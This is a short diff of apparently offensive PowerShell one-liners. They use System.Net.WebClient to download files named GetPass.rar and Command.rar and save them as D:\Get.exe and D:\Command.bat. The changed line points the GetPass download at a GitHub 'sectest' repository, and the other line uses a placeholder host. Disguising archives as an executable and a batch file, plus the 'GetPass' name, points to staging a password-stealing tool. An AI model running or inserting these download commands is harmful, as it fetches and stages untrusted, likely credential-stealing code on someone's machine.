@@ -1,4 +1,4 @@
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/foryou123/sectest/blob/master/GetPass.rar','D:\Get.exe');
 
 
 (new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');
